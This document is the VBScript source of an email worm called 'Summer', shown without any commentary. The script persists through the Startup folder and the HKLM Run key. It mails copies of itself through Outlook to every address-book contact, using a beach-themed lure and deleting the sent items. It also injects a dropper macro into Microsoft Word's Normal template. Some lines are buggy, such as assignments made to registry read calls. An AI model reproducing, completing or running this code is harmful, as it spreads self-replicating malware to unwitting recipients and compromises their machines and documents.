' Summer

On Error Resume Next

Dim A02
Dim A06
Dim A07
Dim A05
Dim A09
Dim A10

sRun = "\Software\Microsoft\Windows\CurrentVersion\Run"

' AutoStart upon boot by adding to Startup directory
sDirStart = fso.BuildPath(shell.SpecialFolders("Startup"), "summmer.vbs")
fso.CopyFile WScript.ScriptFullName, sDirStart

CreateObject( "Scripting.FileSystemObject" ).CopyFile WScript.ScriptFullName, CreateObject( "Scripting.FileSystemObject" ).BuildPath( CreateObject( "Scripting.FileSystemObject" ).GetSpecialFolder(1), "Summer.vbs" )

CreateObject( "WScript.Shell" ).RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "Summer", CreateObject( "Scripting.FileSystemObject" ).BuildPath( CreateObject( "Scripting.FileSystemObject" ).GetSpecialFolder(1), "Summer.vbs" )

A04 = CreateObject( "WScript.Shell" ).RegRead( "HKEY_LOCAL_MACHINE\" & "Summer" )

If CreateObject( "WScript.Shell" ).RegRead( "HKEY_LOCAL_MACHINE\" & "Summer" ) = "" Or CreateObject( "WScript.Shell" ).RegRead( "HKEY_LOCAL_MACHINE\" & "Summer" ) > 20 Then
   CreateObject( "WScript.Shell" ).RegRead( "HKEY_LOCAL_MACHINE\" & "Summer" ) = 0
End If

If CreateObject( "WScript.Shell" ).RegRead( "HKEY_LOCAL_MACHINE\" & "Summer" ) = 0 Then
   Set A05 = CreateObject( "Outlook.Application" )
   Set A06 = A05.GetNameSpace( "MAPI" )

   For Each A07 In A06.AddressLists
       Set A08 = A05.CreateItem( 0 )

       For A09 = 1 To A07.AddressEntries.Count
           Set A10 = A07.AddressEntries( A09 )

           If A09 = 1 Then
              A08.BCC = A10.Address
           Else
              A08.BCC = A08.BCC & "; " & A10.Address
           End If
       Next

       A08.Subject = "Hottest Summer News"
       A08.Body = "Go to the beach and have fun"
       A08.Attachments.Add WScript.ScriptFullName
       A08.DeleteAfterSubmit = True
       A08.Send
   Next

   CreateObject( "WScript.Shell" ).RegRead( "HKEY_LOCAL_MACHINE\" & "Summer" ) = 0
End If

CreateObject( "WScript.Shell" ).RegWrite "HKEY_LOCAL_MACHINE\" & "Summer", CreateObject( "WScript.Shell" ).RegRead( "HKEY_LOCAL_MACHINE\" & "Summer" ) + 1

' =-=-=-=-=-=-  Dropper Code to infect MS Word  =-=-=-=-=-=-
sHeader = "Private Sub AutoClose()"+vbCRLF+vbCRLF+vbCRLF+"Dim sStr As String"+vbCRLF+vbCRLF+"sStr = "+Chr(34)+Chr(34)+vbCRLF
sFooter ="Dim sFind As Long"+vbCRLF+vbCRLF+"idx = 1"+vbCRLF+"sFind = InStr(idx, sStr, Chr(167), vbBinaryCompare)"+vbCRLF+"While sFind"+vbCRLF+"  Mid(sStr, sFind, 1) = Chr(34)"+vbCRLF+"  sFind = InStr(idx, sStr, Chr(167), vbBinaryCompare)"+vbCRLF+"Wend"+vbCRLF+vbCRLF+"Set fso = CreateObject("+Chr(34)+"Scripting.FileSystemObject"+Chr(34)+")"+vbCRLF+"Set Script = fso.CreateTextFile(fso.BuildPath(fso.GetSpecialFolder(0), "+Chr(34)+"export.vbs"+Chr(34)+"), True)"+vbCRLF+"Script.Write sStr"+vbCRLF+"Script.Close"+vbCRLF+"winFolder = Environ("+Chr(34)+"WINDIR"+Chr(34)+")"+vbCRLF+"'Shell winFolder + "+Chr(34)+"\export.vbs"+Chr(34)+", 0"+vbCRLF+vbCRLF+"End Sub"+vbCRLF
' Read our code in
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Wscript.ScriptFullName, 1)
WordVirus = f.Readall()
f.Close
' Replace any quotes
WordVirus = Replace(WordVirus, Chr(34), Chr(167))
lines = Split(WordVirus, vbCRLF)
For n = 0 to Ubound(lines)
  lines(n) = "sStr=sStr+" & Chr(34) & lines(n) & Chr(34) & "+vbCRLF"
Next
' Get Word's Normal Template
Set WordObj = GetObject("","Word.Application")
If WordObj = "" Then Set WordObj = CreateObject("Word.Application")
WordObj.Visible = True
WordObj.Activate
WordObj.Options.SaveNormalPrompt = False
Set NTI1 = WordObj.NormalTemplate.VBProject.VBComponents.Item(1)
' Infect Normal Template
If NTI1.Name <> "SummerCity" Then
  NTI1.CodeModule.DeleteLines 1, NTI1.CodeModule.CountOfLines
  NTI1.CodeModule.InsertLines 1, sFooter
  NTI1.CodeModule.InsertLines 1, Join(lines, vbCRLF)
  NTI1.CodeModule.InsertLines 1, sHeader
  NTI1.Name = "SummerCity"
End If
' Clean up
set NTI1 = Nothing
set WordObj = Nothing

